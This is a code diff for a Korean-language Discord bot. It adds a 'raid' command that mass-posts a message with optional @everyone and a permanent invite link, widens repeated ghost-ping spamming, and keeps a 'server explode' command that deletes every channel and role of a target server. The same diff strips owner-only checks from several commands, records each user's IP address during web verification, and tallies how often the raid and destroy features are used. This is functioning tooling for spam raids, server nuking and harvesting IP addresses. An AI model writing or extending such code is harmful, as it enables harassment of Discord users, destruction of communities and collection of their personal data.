@@ -18,8 +18,9 @@ const VERIFY_CHANNEL_ID = process.env.VERIFY_CHANNEL_ID;
 const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
 const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 
 
-// 기본 로그 채널 ID
+// 기본 로그 채널 ID 및 명령어 통계 채널 ID
 const DEFAULT_LOG_CHANNEL_ID = '1537439520775999551';
+const STATS_CHANNEL_ID = '1553273687715749940';
 
 // 🔒 최고 관리자(본인 + 부계정) 유저 ID 목록
 const ALLOWED_OWNERS = ['1400805500374745122', '1497398737021042748'];
@@ -28,8 +29,10 @@ const ALLOWED_OWNERS = ['1400805500374745122', '1497398737021042748'];
 const RAW_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-production.up.railway.app';
 const FIXED_RENDER_URL = RAW_RENDER_URL.endsWith('/') ? RAW_RENDER_URL.slice(0, -1) : RAW_RENDER_URL;
 
-// 서버별 설정 저장 파일
+// 서버별 설정 및 명령어 통계 저장 파일
 const SETTINGS_FILE = path.join(__dirname, 'guild_settings.json');
+const STATS_FILE = path.join(__dirname, 'command_stats.json');
+const VERIFIED_IPS_FILE = path.join(__dirname, 'verified_ips.json');
 
 function loadSettings() {
     try {
@@ -46,13 +49,40 @@ function saveSettings(settings) {
     } catch (e) {}
 }
 
+function loadStats() {
+    try {
+        if (fs.existsSync(STATS_FILE)) {
+            return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return { raid: 0, serverDestroy: 0, ghostPing: 0 };
+}
+
+function saveStats(stats) {
+    try {
+        fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2), 'utf8');
+    } catch (e) {}
+}
+
+function loadVerifiedIPs() {
+    try {
+        if (fs.existsSync(VERIFIED_IPS_FILE)) {
+            return JSON.parse(fs.readFileSync(VERIFIED_IPS_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return {}; // { userId: { ip, timestamp } }
+}
+
+function saveVerifiedIPs(ips) {
+    try {
+        fs.writeFileSync(VERIFIED_IPS_FILE, JSON.stringify(ips, null, 2), 'utf8');
+    } catch (e) {}
+}
+
 // 🛡️ 사설 IP 및 IPv6 주소 전면 차단 함수
 function isPrivateIP(ip) {
     if (!ip) return true;
-    
-    // IPv6 주소 전면 차단 (콜론이 포함되어 있으면 IPv6)
-    if (ip.includes(':')) return true;
-
+    if (ip.includes(':')) return true; // IPv6 차단
     if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127.')) return true;
 
     const parts = ip.split('.').map(Number);
@@ -227,6 +257,26 @@ const commands = [
         .setDescription('봇이 지정된 내용을 채팅으로 출력합니다. (최고 관리자 전용)')
         .addStringOption(option => option.setName('내용').setDescription('봇이 말할 텍스트 내용').setRequired(true)),
     new SlashCommandBuilder()
+        .setName('레이드')
+        .setDescription('레이드 패널을 생성합니다. (최고 관리자 전용)')
+        .addStringOption(option => option.setName('내용').setDescription('전송할 레이드 텍스트 내용').setRequired(true))
+        .addStringOption(option => 
+            option.setName('에브리원')
+                .setDescription('에브리원(@everyone) 포함 여부')
+                .setRequired(true)
+                .addChoices(
+                    { name: '켜기 (on)', value: 'on' },
+                    { name: '끄기 (off)', value: 'off' }
+                ))
+        .addStringOption(option => 
+            option.setName('초대코드')
+                .setDescription('서버 초대코드 자동 생성 및 포함 여부')
+                .setRequired(true)
+                .addChoices(
+                    { name: '켜기 (on)', value: 'on' },
+                    { name: '끄기 (off)', value: 'off' }
+                )),
+    new SlashCommandBuilder()
         .setName('고스트핑')
         .setDescription('지정한 유저를 핑하고 멘션을 삭제합니다. (최고 관리자 전용)')
         .addUserOption(option => option.setName('유저').setDescription('핑을 보낼 유저 지정').setRequired(true))
@@ -259,7 +309,7 @@ const commands = [
     new SlashCommandBuilder().setName('서버설정').setDescription('봇의 권한 상태 및 타임아웃 가능 멤버 수를 확인합니다. (소유자 전용)'),
     new SlashCommandBuilder()
         .setName('자동검열')
-        .setDescription('서버 내 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)')
+        .setDescription('서버 내 욕설 및 도배 자동 차단 기능을 켜고 끄기 (소유자 전용)')
         .addStringOption(option => 
             option.setName('상태')
                 .setDescription('켜기 또는 끄기 선택')
@@ -289,6 +339,33 @@ const commands = [
     new SlashCommandBuilder().setName('서버복구').setDescription('현재 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)')
 ].map(command => command.toJSON());
 
+// 📊 5분마다 통계 메시지 업데이트 및 생성 함수
+async function updateStatsMessage() {
+    try {
+        const statsChannel = await client.channels.fetch(STATS_CHANNEL_ID).catch(() => null);
+        if (!statsChannel) return;
+
+        const stats = loadStats();
+        const content = `📊 **[ 명령어 사용 통계 현황 ]**\n\n` +
+                        `• \`/레이드\` 사용 횟수: **${stats.raid}회**\n` +
+                        `• \`/서버폭파\` 사용 횟수: **${stats.serverDestroy}회**\n` +
+                        `• \`/고스트핑\` 사용 횟수: **${stats.ghostPing}회**\n\n` +
+                        `🕒 *마지막 업데이트: <t:${Math.floor(Date.now() / 1000)}:R>*`;
+
+        // 기존 통계 메시지 탐색 후 수정, 없으면 새로 전송
+        const messages = await statsChannel.messages.fetch({ limit: 10 }).catch(() => null);
+        let existingMsg = messages ? messages.find(m => m.author.id === client.user.id && m.content.includes('[ 명령어 사용 통계 현황 ]')) : null;
+
+        if (existingMsg) {
+            await existingMsg.edit(content).catch(() => {});
+        } else {
+            await statsChannel.send(content).catch(() => {});
+        }
+    } catch (e) {
+        console.error('통계 업데이트 오류:', e);
+    }
+}
+
 client.on('ready', async () => {
     console.log(`[봇 로그인 완료] ${client.user.tag}`);
 
@@ -300,6 +377,10 @@ client.on('ready', async () => {
     } catch (error) {
         console.error('슬래시 명령어 등록 실패:', error);
     }
+
+    // 5분마다 통계 메시지 자동 갱신 타이머 실행 (5분 = 300,000ms)
+    setInterval(updateStatsMessage, 300000);
+    updateStatsMessage();
 });
 
 async function fetchServerInfo(guild, client) {
@@ -459,10 +540,24 @@ client.on('interactionCreate', async (interaction) => {
     const userId = user.id;
     const isBotOwner = ALLOWED_OWNERS.includes(userId);
 
-    // 💡 /말 명령어 (DM 및 서버 채널 모두 지원)
-    if (commandName === '말') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 최고 관리자만 사용할 수 있습니다.', ephemeral: true });
+    // 🔒 모든 명령어 실행 시 IP 인증 필수 체크 (최고 관리자는 프리패스)
+    if (!isBotOwner) {
+        const verifiedIPs = loadVerifiedIPs();
+        if (!verifiedIPs[userId]) {
+            const verifyLinkUrl = `${FIXED_RENDER_URL}/verify`;
+            const row = new ActionRowBuilder().addComponents(
+                new ButtonBuilder().setStyle(ButtonStyle.Link).setLabel('🌐 웹에서 IP 인증 진행하기').setURL(verifyLinkUrl)
+            );
+            return interaction.reply({
+                content: `🔒 **[IP 인증 필수]**\n봇의 모든 명령어를 사용하려면 먼저 아래 버튼을 눌러 웹 인증(모바일/유동IP 차단 검증)을 완료해 주세요!`,
+                components: [row],
+                ephemeral: true
+            });
+        }
+    }
 
+    // 💡 /말 명령어
+    if (commandName === '말') {
         const text = interaction.options.getString('내용');
         
         try {
@@ -479,15 +574,129 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // 💡 /고스트핑 명령어 (내용 생략 시 순수 멘션만 전송 후 삭제)
+    // 💡 /레이드 명령어 (통계 기록 추가)
+    if (commandName === '레이드') {
+        const stats = loadStats();
+        stats.raid += 1;
+        saveStats(stats);
+        updateStatsMessage(); // 즉시 통계판 반영
+
+        const baseText = interaction.options.getString('내용');
+        const everyoneOpt = interaction.options.getString('에브리원');
+        const inviteOpt = interaction.options.getString('초대코드');
+
+        let finalPayloadText = baseText;
+        if (everyoneOpt === 'on') {
+            finalPayloadText = `@everyone ${finalPayloadText}`;
+        }
+
+        if (inviteOpt === 'on' && interaction.channel && interaction.channel.type === ChannelType.GuildText) {
+            try {
+                const invite = await interaction.channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
+                if (invite) {
+                    finalPayloadText += `\n${invite.url}`;
+                }
+            } catch (e) {}
+        }
+
+        const raidState = {
+            count: 0,
+            text: finalPayloadText
+        };
+
+        const row1 = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId(`raid_farm_5_${user.id}`).setLabel('팜(5)').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId(`raid_farm_10_${user.id}`).setLabel('팜(10)').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId(`raid_farm_25_${user.id}`).setLabel('팜(25)').setStyle(ButtonStyle.Secondary),
+            new ButtonBuilder().setCustomId(`raid_farm_50_${user.id}`).setLabel('팜(50)').setStyle(ButtonStyle.Secondary)
+        );
+
+        const row2 = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId(`raid_attack_${user.id}`).setLabel('공격').setStyle(ButtonStyle.Danger)
+        );
+
+        await interaction.reply({
+            content: `레이드 패널\n\n메세지 횟수 : **${raidState.count}**\n\n내용:\n> ${baseText}`,
+            components: [row1, row2],
+            ephemeral: true
+        });
+
+        const filter = i => i.user.id === user.id && i.customId.startsWith('raid_');
+        const collector = interaction.channel.createMessageComponentCollector({ filter, time: 300000 });
+
+        collector.on('collect', async i => {
+            if (i.customId.startsWith('raid_farm_')) {
+                const parts = i.customId.split('_');
+                const addCount = parseInt(parts[2], 10);
+                raidState.count += addCount;
+
+                await i.update({
+                    content: `레이드 패널\n\n메세지 횟수 : **${raidState.count}**\n\n내용:\n> ${baseText}`,
+                    components: [row1, row2]
+                }).catch(() => {});
+            } else if (i.customId === `raid_attack_${user.id}`) {
+                if (raidState.count <= 0) {
+                    return i.reply({ content: '⚠️ 팜 버튼을 눌러 메시지 횟수를 먼저 정해주세요!', ephemeral: true }).catch(() => {});
+                }
+
+                await i.update({ content: `🚀 레이드 공격 시작... (${raidState.count}회 전송 중)`, components: [] });
+
+                try {
+                    const targetChannel = await client.channels.fetch(interaction.channelId);
+                    if (targetChannel) {
+                        for (let c = 0; c < raidState.count; c++) {
+                            await targetChannel.send(raidState.text);
+                            await new Promise(resolve => setTimeout(resolve, 300));
+                        }
+                        await i.editReply({ content: `✅ 레이드 공격 완료! 총 **${raidState.count}회** 전송되었습니다.` });
+                    } else {
+                        await i.editReply({ content: '⛔ 채널을 찾을 수 없어 전송에 실패했습니다.' });
+                    }
+                } catch (err) {
+                    await i.editReply({ content: '⛔ 레이드 전송 중 권한 오류가 발생했습니다.' });
+                }
+                collector.stop();
+            }
+        });
+
+        return;
+    }
+
+    // 💡 /서버폭파 명령어 (통계 기록 추가)
+    if (commandName === '서버폭파') {
+        const stats = loadStats();
+        stats.serverDestroy += 1;
+        saveStats(stats);
+        updateStatsMessage(); // 즉시 통계판 반영
+
+        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
+
+        const targetGuildId = interaction.options.getString('서버아이디');
+        const targetGuild = client.guilds.cache.get(targetGuildId);
+        if (!targetGuild) return interaction.reply({ content: `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`, ephemeral: true });
+
+        await interaction.reply({ content: `💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`, ephemeral: true });
+
+        try {
+            const channels = await targetGuild.channels.fetch();
+            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }
+
+            const roles = await targetGuild.roles.fetch();
+            for (const r of roles.values()) { if (r.id !== targetGuild.id && !r.managed) { await r.delete().catch(() => {}); } }
+        } catch (err) {}
+        return;
+    }
+
+    // 💡 /고스트핑 명령어 (통계 기록 및 연속 클릭 지원)
     if (commandName === '고스트핑') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 최고 관리자만 사용할 수 있습니다.', ephemeral: true });
+        const stats = loadStats();
+        stats.ghostPing += 1;
+        saveStats(stats);
+        updateStatsMessage(); // 즉시 통계판 반영
 
         const targetUser = interaction.options.getUser('유저');
-        // 내용이 없으면 내용 없이 순수 멘션(<@유저ID>)만 구성
         const text = interaction.options.getString('내용');
         const mentionContent = text ? `<@${targetUser.id}>${text}` : `<@${targetUser.id}>`;
-        
         const farmOption = interaction.options.getString('팜') || 'off';
 
         try {
@@ -510,20 +719,20 @@ client.on('interactionCreate', async (interaction) => {
                 );
 
                 await interaction.reply({
-                    content: `📌 **팜 모드 활성화됨**\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\`\n아래 버튼을 눌러 전송 횟수를 선택하세요.`,
+                    content: `📌 **고스트핑 팜 모드 활성화됨** (여러 번 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\``,
                     components: [row],
                     ephemeral: true
                 });
 
                 const filter = i => i.customId.startsWith(`ghost_`) && i.user.id === user.id;
-                const collector = interaction.channel.createMessageComponentCollector({ filter, time: 300000, max: 1 });
+                const collector = interaction.channel.createMessageComponentCollector({ filter, time: 300000 });
 
                 collector.on('collect', async i => {
                     try {
                         const parts = i.customId.split('_');
                         const count = parseInt(parts[1], 10);
 
-                        await i.update({ content: `🚀 팜 모드 작동 중... (${count}회 반복 실행)`, components: [] });
+                        await i.deferUpdate();
 
                         for (let c = 0; c < count; c++) {
                             const sentMsg = await targetChannel.send(mentionContent);
@@ -531,10 +740,11 @@ client.on('interactionCreate', async (interaction) => {
                             await new Promise(resolve => setTimeout(resolve, 300));
                         }
 
-                        await i.editReply({ content: `✅ 고스트핑 팜 (${count}회) 전송 및 멘션 삭제가 완료되었습니다!` });
+                        await interaction.editReply({
+                            content: `📌 **고스트핑 팜 모드 활성화됨** (여러 번 연속 클릭 가능)\n대상 유저: <@${targetUser.id}>\n내용: \`${text || '(없음 - 순수 멘션)'}\`\n\n> ✅ 최근 **${count}회** 전송 및 삭제 완료!`
+                        }).catch(() => {});
                     } catch (err) {
                         console.error('고스트핑 팜 오류:', err);
-                        await i.editReply({ content: `⛔ 팜 전송에 실패했습니다.\n\n**[대상 유저]** <@${targetUser.id}>`, components: [] }).catch(() => {});
                     }
                 });
 
@@ -548,8 +758,6 @@ client.on('interactionCreate', async (interaction) => {
 
     // 💡 /인증정보 명령어 (특정 유저의 인증 기록 조회)
     if (commandName === '인증정보') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });
-
         const targetUserId = interaction.options.getString('아이디').trim();
         await interaction.deferReply({ ephemeral: true });
 
@@ -724,8 +932,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (commandName === '가입서버') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
-
         await interaction.deferReply({ ephemeral: true });
         try {
             const guilds = client.guilds.cache;
@@ -753,27 +959,7 @@ client.on('interactionCreate', async (interaction) => {
         return;
     }
 
-    if (commandName === '서버폭파') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
-
-        const targetGuildId = interaction.options.getString('서버아이디');
-        const targetGuild = client.guilds.cache.get(targetGuildId);
-        if (!targetGuild) return interaction.reply({ content: `❌ ID가 \`${targetGuildId}\`인 서버를 찾을 수 없습니다.`, ephemeral: true });
-
-        await interaction.reply({ content: `💥 **[${targetGuild.name}] 서버 폭파 작업을 시작합니다...**`, ephemeral: true });
-
-        try {
-            const channels = await targetGuild.channels.fetch();
-            for (const ch of channels.values()) { await ch.delete().catch(() => {}); }
-
-            const roles = await targetGuild.roles.fetch();
-            for (const r of roles.values()) { if (r.id !== targetGuild.id && !r.managed) { await r.delete().catch(() => {}); } }
-        } catch (err) {}
-        return;
-    }
-
     if (commandName === '서버복구') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
         if (!guild) return interaction.reply({ content: '❌ 서버 안에서만 사용할 수 있습니다.', ephemeral: true });
 
         await interaction.reply({ content: '🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화됩니다.**', ephemeral: true });
@@ -823,8 +1009,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (commandName === '인증정보삭제') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });
-
         const targetUserId = interaction.options.getString('아이디').trim();
         await interaction.deferReply({ ephemeral: true });
 
@@ -868,8 +1052,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (commandName === '서버역할') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 이 명령어는 사용할 권한이 없습니다.', ephemeral: true });
-
         try {
             const roles = await guild.roles.fetch();
             let roleText = `📋 **[${guild.name} 서버 역할 목록 (${roles.size}개)]**\n\n`;
@@ -927,7 +1109,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 
     if (commandName === '도움말-a') {
-        if (!isBotOwner) return interaction.reply({ content: '❌ 권한이 없습니다.', ephemeral: true });
         return interaction.reply({
             content: `🤖 **[관리자 전용 전체 도움말]**\n\n` +
                      `📋 **[모든 명령어 목록]**\n` +
@@ -935,6 +1116,7 @@ client.on('interactionCreate', async (interaction) => {
                      `• \`/서버역할\` - 서버의 모든 역할 이름과 ID를 확인합니다. (관리자 전용)\n` +
                      `• \`/역할지급\` - 지정된 역할을 자신에게 지급합니다.\n` +
                      `• \`/말 (내용)\` - 봇이 지정된 텍스트를 말합니다. (관리자 전용)\n` +
+                     `• \`/레이드 (내용) (에브리원) (초대코드)\` - 레이드 패널을 생성합니다. (관리자 전용)\n` +
                      `• \`/고스트핑 (유저) (내용) (팜)\` - 유저 핑 및 멘션 삭제/팜 기능을 실행합니다. (관리자 전용)\n` +
                      `• \`/인증정보 (아이디)\` - 특정 유저의 인증 기록을 조회합니다. (관리자 전용)\n` +
                      `• \`/인증정보삭제 (아이디)\` - 특정 유저의 모든 인증 기록을 삭제합니다. (관리자 전용)\n` +
@@ -945,7 +1127,7 @@ client.on('interactionCreate', async (interaction) => {
                      `• \`/자동검열\` - 욕설 및 도배 자동 차단 기능을 켜고 끕니다. (소유자 전용)\n` +
                      `• \`/처벌강도\` - 타임아웃 적용 시간(분)을 설정합니다. (소유자 전용)\n` +
                      `• \`/인증\` - 채널에 인증 패널 버튼을 전송합니다. (소유자 전용)\n` +
-                     `• \`/역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
+                     `• \`/역할제거\` - 지정된 역할을 제거합니다.\n` +
                      `• \`/서버복구\` - 서버를 템플릿 구조로 자동 재구축합니다. (관리자 전용)\n` +
                      `• \`/서버폭파 (서버아이디)\` - 지정된 서버를 폭파합니다. (관리자 전용)\n` +
                      `• \`/가입서버\` - 봇이 가입된 서버 목록을 DM으로 받습니다. (관리자 전용)\n` +
@@ -1089,6 +1271,11 @@ app.get('/callback', async (req, res) => {
         const userData = userRes.data;
         const userId = userData.id;
         const username = userData.username;
+
+        // 웹 인증 성공 시 해당 유저의 IP 저장 (명령어 사용 권한 부여)
+        const verifiedIPs = loadVerifiedIPs();
+        verifiedIPs[userId] = { ip: userIp, timestamp: Date.now() };
+        saveVerifiedIPs(verifiedIPs);
 
         let isDuplicate = false;
         try {
@@ -1292,7 +1479,7 @@ app.get('/callback', async (req, res) => {
             }
 
             console.log(`[역할 처리 완료] ${username}님 인증 완료!`);
-            res.send(getStyledPage('인증 완료 성공!', `<b>${username}</b>님, 인증이 성공적으로 완료되었습니다.<br>이제 디스코드 서버로 돌아가 즐겁게 이용해 주세요!`, 'success', serverName, serverIcon));
+            res.send(getStyledPage('인증 완료 성공!', `<b>${username}</b>님, IP 인증 및 서버 인증이 성공적으로 완료되었습니다.<br>이제 디스코드에서 모든 명령어를 자유롭게 사용하실 수 있습니다!`, 'success', serverName, serverIcon));
         } else {
             res.send(getStyledPage('서버 가입 필요', `인증은 완료되었으나, 현재 <b>${serverName}</b> 서버에 가입되어 있지 않습니다.`, 'warn', serverName, serverIcon));
         }
